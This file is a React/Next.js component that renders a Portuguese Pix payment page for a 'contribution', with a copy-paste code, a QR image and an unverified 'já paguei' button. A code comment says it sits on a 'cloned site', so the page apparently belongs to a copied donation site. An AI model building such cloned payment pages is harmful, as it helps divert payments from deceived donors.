"use client";

import { useState } from "react";

export default function PixClient({
  pixCode,
  qrCode,
  transactionId,
  amountCents,
}: {
  pixCode: string;
  qrCode?: string;
  transactionId?: string;
  amountCents?: number | null;
}) {
  const [copied, setCopied] = useState(false);
  const qrSrc = qrCode
    ? qrCode.startsWith("data:") || qrCode.startsWith("http")
      ? qrCode
      : `data:image/png;base64,${qrCode}`
    : `https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(pixCode)}`;

  async function copy() {
    try {
      await navigator.clipboard.writeText(pixCode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch {
      // fallback
      const ta = document.createElement("textarea");
      ta.value = pixCode;
      document.body.appendChild(ta);
      ta.select();
      document.execCommand("copy");
      document.body.removeChild(ta);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  }

  return (
    <div style={{ minHeight: "100vh", background: "#fff", fontFamily: "'Lato','Montserrat',system-ui,sans-serif" }}>
      {/* header simples sem alterar template do site clonado */}
      <div style={{ maxWidth: 640, margin: "0 auto", padding: "28px 20px 40px" }}>
        <h1
          style={{
            fontSize: 22,
            fontWeight: 800,
            color: "#282828",
            margin: "0 0 20px",
            textAlign: "left",
            lineHeight: 1.25,
            fontFamily: "Montserrat, Lato, sans-serif",
          }}
        >
          Efetue o pagamento para confirmar a contribuição
        </h1>

        {/* Container 1 - Pix Copia e Cola */}
        <div
          style={{
            background: "#f6f6f6",
            borderRadius: 12,
            padding: 16,
            marginBottom: 16,
            border: "1px solid #eeeeee",
          }}
        >
          <div style={{ fontWeight: 800, fontSize: 15, color: "#282828", marginBottom: 6 }}>Pix Copia e Cola</div>
          <div style={{ fontSize: 13, color: "#5a5a5a", lineHeight: 1.5, marginBottom: 12 }}>
            Clique no botão para copiar o código e escolha pagar via Pix Copia e Cola no aplicativo do seu banco.
          </div>

          <div
            onClick={copy}
            role="button"
            tabIndex={0}
            onKeyDown={(e) => e.key === "Enter" && copy()}
            style={{
              display: "flex",
              alignItems: "center",
              gap: 8,
              background: "#fff",
              border: "1px solid #d9d9d9",
              borderRadius: 8,
              padding: "12px 12px",
              cursor: "pointer",
              userSelect: "all",
            }}
            title="Clique para copiar"
          >
            <div
              style={{
                flex: 1,
                fontSize: 13,
                color: "#3a3a3a",
                wordBreak: "break-all",
                lineHeight: 1.4,
                fontFamily: "ui-monospace, Menlo, monospace",
              }}
            >
              {pixCode}
            </div>
            <button
              onClick={(e) => {
                e.stopPropagation();
                copy();
              }}
              aria-label="Copiar código Pix"
              style={{
                flexShrink: 0,
                width: 36,
                height: 36,
                borderRadius: 8,
                border: "1px solid #e0e0e0",
                background: "#fff",
                display: "grid",
                placeItems: "center",
                cursor: "pointer",
              }}
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                <rect x="9" y="9" width="10" height="10" rx="2" stroke="#24ca68" strokeWidth="1.8" />
                <path
                  d="M15 9V7a2 2 0 00-2-2H7a2 2 0 00-2 2v6a2 2 0 002 2h2"
                  stroke="#24ca68"
                  strokeWidth="1.8"
                  strokeLinecap="round"
                />
              </svg>
            </button>
          </div>
          {transactionId && (
            <div style={{ fontSize: 11, color: "#8a8a8a", marginTop: 8 }}>
              ID: {transactionId}
              {amountCents ? ` • Valor: R$ ${(amountCents / 100).toFixed(2).replace(".", ",")}` : ""}
            </div>
          )}
        </div>

        {/* Container 2 - Pix com QR Code */}
        <div
          style={{
            background: "#f6f6f6",
            borderRadius: 12,
            padding: 16,
            marginBottom: 20,
            border: "1px solid #eeeeee",
          }}
        >
          <div style={{ fontWeight: 800, fontSize: 15, color: "#282828", marginBottom: 14 }}>Pix com QR Code</div>
          <div
            style={{
              display: "flex",
              gap: 16,
              alignItems: "center",
              flexWrap: "wrap",
            }}
          >
            {/* QR Code */}
            <div
              style={{
                background: "#fff",
                borderRadius: 12,
                padding: 12,
                border: "1px solid #e9e9e9",
                flexShrink: 0,
                margin: "0 auto",
              }}
            >
              {/* eslint-disable-next-line @next/next/no-img-element */}
              <img
                src={qrSrc}
                alt="QR Code Pix"
                width={180}
                height={180}
                style={{ display: "block", width: 180, height: 180, objectFit: "contain" }}
              />
            </div>

            {/* Passos */}
            <div style={{ flex: 1, minWidth: 220, display: "flex", flexDirection: "column", gap: 14 }}>
              <div style={{ display: "flex", gap: 12, alignItems: "flex-start" }}>
                <div
                  style={{
                    width: 28,
                    height: 28,
                    borderRadius: "50%",
                    background: "#24ca68",
                    color: "#fff",
                    display: "grid",
                    placeItems: "center",
                    fontWeight: 800,
                    fontSize: 13,
                    flexShrink: 0,
                  }}
                >
                  1
                </div>
                <div style={{ fontSize: 13, color: "#3a3a3a", lineHeight: 1.5 }}>
                  No aplicativo do seu banco, escolha a opção <strong>&lsquo;Ler QR Code&rsquo;</strong> no menu Pix.
                </div>
              </div>
              <div style={{ display: "flex", gap: 12, alignItems: "flex-start" }}>
                <div
                  style={{
                    width: 28,
                    height: 28,
                    borderRadius: "50%",
                    background: "#24ca68",
                    color: "#fff",
                    display: "grid",
                    placeItems: "center",
                    fontWeight: 800,
                    fontSize: 13,
                    flexShrink: 0,
                  }}
                >
                  2
                </div>
                <div style={{ fontSize: 13, color: "#3a3a3a", lineHeight: 1.5 }}>
                  Escaneie o QR Code. Confirme as informações e finalize.
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Botão principal */}
        <button
          onClick={() => {
            // sem alterar template, apenas feedback - pode integrar com webhook de confirmação
            window.location.href = "/?pagamento=confirmado";
          }}
          style={{
            width: "100%",
            background: "#24ca68",
            color: "#fff",
            border: "none",
            borderRadius: 10,
            padding: "14px 16px",
            fontWeight: 800,
            fontSize: 15,
            cursor: "pointer",
            fontFamily: "Montserrat, sans-serif",
            transition: "background 0.15s",
          }}
          onMouseEnter={(e) => ((e.currentTarget.style.background = "#009d4e"))}
          onMouseLeave={(e) => ((e.currentTarget.style.background = "#24ca68"))}
        >
          Tudo certo, já paguei!
        </button>

        {/* Rodapé suporte */}
        <div style={{ textAlign: "center", marginTop: 14, fontSize: 13, color: "#5a5a5a" }}>
          Código não está funcionando?{" "}
          <a href="#" onClick={(e) => { e.preventDefault(); copy(); }} style={{ color: "#24ca68", fontWeight: 700, textDecoration: "underline" }}>
            Clique aqui
          </a>
        </div>

        {/* Toast */}
        {copied && (
          <div
            role="status"
            aria-live="polite"
            style={{
              position: "fixed",
              bottom: 20,
              left: "50%",
              transform: "translateX(-50%)",
              background: "#1a5c2e",
              color: "#fff",
              padding: "10px 16px",
              borderRadius: 8,
              fontSize: 13,
              fontWeight: 700,
              boxShadow: "0 8px 24px rgba(0,0,0,0.18)",
              zIndex: 9999,
            }}
          >
            Código copiado!
          </div>
        )}
      </div>

      <style>{`
        @media (max-width: 560px) {
          h1 { font-size: 19px !important; }
        }
      `}</style>
    </div>
  );
}
